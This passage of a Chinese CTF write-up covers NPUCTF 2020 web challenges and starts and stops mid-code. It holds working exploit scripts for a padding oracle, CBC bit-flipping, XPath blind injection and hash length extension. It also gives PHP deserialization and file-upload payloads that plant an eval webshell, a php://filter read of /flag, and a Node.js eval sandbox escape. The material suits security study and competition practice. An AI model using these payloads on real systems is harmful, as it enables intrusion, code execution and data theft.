class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>从上面代码可知128位的cbc，blocksize是16字节，加密IV已知，secret未知，我们还知道解密是否成功，密文，我们又可以控制密文和解密的IV，可以使用padding oracle爆出明文。</p><p>具体的<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">攻击理论</a></p><p><a href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/#web" target="_blank" rel="noopener">glotozz</a>师傅的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>爆出明文 <code>FlagIsHere.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>CBC字节反转攻击</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'sS8OuVOl9tyCkzAzsabGBA=='</span>  <span class="comment"># 你获得的初始IV的base64encode值</span></span><br><span class="line">token = list(b64.b64decode(token))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line"><span class="keyword">print</span> b64.b64encode(<span class="string">''</span>.join(token))</span><br></pre></td></tr></table></figure><p>得到网盘地址下载得到<code>HelloWorld.class</code>，<code>jd-gui</code>反编译得到byte流,后面python解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(bytearray([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]))</span><br></pre></td></tr></table></figure><h3 id="2-ReadlezPHP"><a href="#2-ReadlezPHP" class="headerlink" title="2.ReadlezPHP"></a>2.ReadlezPHP</h3><p>看源码，跳转到<code>/time.php?source</code>得到源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">#error_reporting(0);</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $b;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $a = <span class="keyword">$this</span>-&gt;a;</span></span><br><span class="line"><span class="php">        $b = <span class="keyword">$this</span>-&gt;b;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $b($a);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> HelloPhp;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span></span><br></pre></td></tr></table></figure><p>简单的反序列化，这里需要注意的是不能用 <code>eval</code> 因为eval是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a> 调用。</p><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><p>在PHP7中assert变成了一种语言结构而不是一个函数。也就是说像eval一样不支持可变函数。但某几个php7版本支持可变函数。</p><p>题目这个7.0.33版本正好可以.</p><p>构造反序列化payload，本地测试成功，但打过去命令没执行。怀疑是被禁用了系统函数，所以构造payload查看phpinfo();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$o-&gt;a = <span class="string">'phpinfo()'</span>;</span><br><span class="line">$o-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure><p><img src="/2020/05/NPUCTF2020-复现/image-20200527184236232.png" alt="image-20200527184236232"></p><p>这种情况一般是写个马上去，然后用其他方法bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;a = <span class="string">'file_put_contents("1.php", "&lt;?php eval(\$_REQUEST[\'a\']); ?&gt;")'</span>;</span><br></pre></td></tr></table></figure><p>然后利用蚁剑插件直接绕过</p><p>最后在环境变量中找到了flag</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527191351755.png" alt="image-20200527191351755"></p><h3 id="3-ezlogin"><a href="#3-ezlogin" class="headerlink" title="3.ezlogin"></a>3.ezlogin</h3><p>弱口令，直接访问admin.php,都没啥发现，后面抓包看到是XML格式提交，考虑XXE或XPATH注入</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527192234895.png" alt="image-20200527192234895"></p><p>后面发现一个会话只有15秒，只能写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://d13a21db-47ab-4bae-a43f-86d733871552.node3.buuoj.cn/'</span></span><br><span class="line">payload = <span class="string">"' or substring(&#123;target&#125;,&#123;index&#125;,1)='&#123;char&#125;' or '"</span></span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span><span class="params">()</span>:</span></span><br><span class="line">    res = session.get(base_url, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">                                         <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=5d86406434bb835c822991118a6a8eee0'</span>&#125;).text</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">'&lt;input.*value="(.*?)"./&gt;'</span>, res)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入payload</span></span><br><span class="line">target = <span class="string">'count(/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target = <span class="string">'count(/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=3'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[1])'</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[2])'</span></span><br><span class="line"><span class="comment">#guest</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[3])'</span></span><br><span class="line"><span class="comment">#e10adc3949ba.......</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[2])'</span></span><br><span class="line"><span class="comment">#adm1n</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[3])'</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">'&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;token&#125;&lt;/token&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">           <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">           <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=0f91e551561497454d0b8e91253ca104'</span>&#125;</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        temp_payload = payload.format(target=target, index=str(i), char=j)</span><br><span class="line"></span><br><span class="line">        token = get_csrf()</span><br><span class="line"></span><br><span class="line">        temp_data = data.format(username=temp_payload, token=token)</span><br><span class="line">        res = session.post(url=base_url+<span class="string">'login.php'</span>,</span><br><span class="line">                           data=temp_data, headers=headers)</span><br><span class="line">        <span class="comment"># print(temp_data)</span></span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(len(res.text))</span></span><br><span class="line">        <span class="keyword">if</span> len(res.text) == <span class="number">5</span>:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>拿到密码md5解密得到密码 <code>gtfly123</code>，登陆后观察到url中<code>?file=welcome</code></p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527205557544.png" alt="image-20200527205557544"></p><p>任意文件读取</p><p>但使用一般的php://filter发现其被过滤了，那么尝试后发现过滤了一下关键字：<code>php: .php read base</code></p><p>并且返回的内容中不能含有flag字符串，fuzz后发现其没有过滤大小写，那么用大写绕过协议，read可省略，编码方式使用rot13：pHp://filter/string.rot13/resource=/flag</p><h3 id="4-ezinclude"><a href="#4-ezinclude" class="headerlink" title="4.ezinclude"></a>4.ezinclude</h3><p>根据hint        md5($secret.$name)===$pass可以知道这题是个hash长度扩展攻击 但是，看到其他师傅有个非预期解</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527214601299.png" alt="image-20200527214601299"></p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527214620796.png" alt="image-20200527214620796"></p><p>正常的解法是hash长度扩展攻击</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    data=os.popen(<span class="string">'hashpump -s 6c24bc6e5b7444222bd69cfc90fa536c -d zz -k '</span>+str(i)+<span class="string">' -a zz'</span>).read()</span><br><span class="line">    name=data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>].replace(<span class="string">'\\x'</span>,<span class="string">'%'</span>)</span><br><span class="line">    result=requests.get(<span class="string">'http://ec560480-bfa8-4fda-bb89-116987af030d.node3.buuoj.cn/index.php?name='</span>+password+<span class="string">'&amp;pass='</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>直接访问会跳转404，所以用Burp发包。</p><p>是一个文件包含</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200528220708064.png" alt="image-20200528220708064"></p><p>比较坑的地方是dir.php 要扫描。如果得到了dir.php，应该都会想到上传临时文件getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">true<span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php eval($_POST['a']);"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://usrl/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>从dir.php获取临时文件名getshell</p><p>最后是在phpinfo()页面找到flag</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200528223919475.png" alt="image-20200528223919475"></p><h3 id="5-验证🐎"><a href="#5-验证🐎" class="headerlink" title="5.验证🐎"></a>5.验证🐎</h3><p>关键源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先考虑第一层，<br><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>keys不可知，无法爆破，而且需要.length相等，但是本身不相等，注意，此处用的是===以使类型和值完全匹配<br>对其进行加盐md5，加盐中出现了问题，因为盐是字符串，与字符串相加会导致强制类型转化 而String和Array都正好有length属性，并且</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200605101837835.png" alt="image-20200605101837835"></p><p>但是直接传urlencoded的表单是没法传数组的，而这里正好使用了JSON的中间件，所以只需要传JSON就好了</p><p>然后考虑绕过正则，必须以 <code>Math.</code>开头的字符串，符号只能出现<code>()+\-*&amp;|%^&lt;&gt;=,?:</code>，虽然可以 <code>Math.__proto__</code>但在这里无法直接利用。</p><p>但可以通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">箭头函数</a>构造这种链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="comment">// Math.__proto__.__proto__</span></span><br></pre></td></tr></table></figure><p>然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用String.fromCharCode(…）然后利用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor" target="_blank" rel="noopener">Object.prototype.constructor</a>从原型链上导出 <code>String</code> 和Function</p><p>payloay大致如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 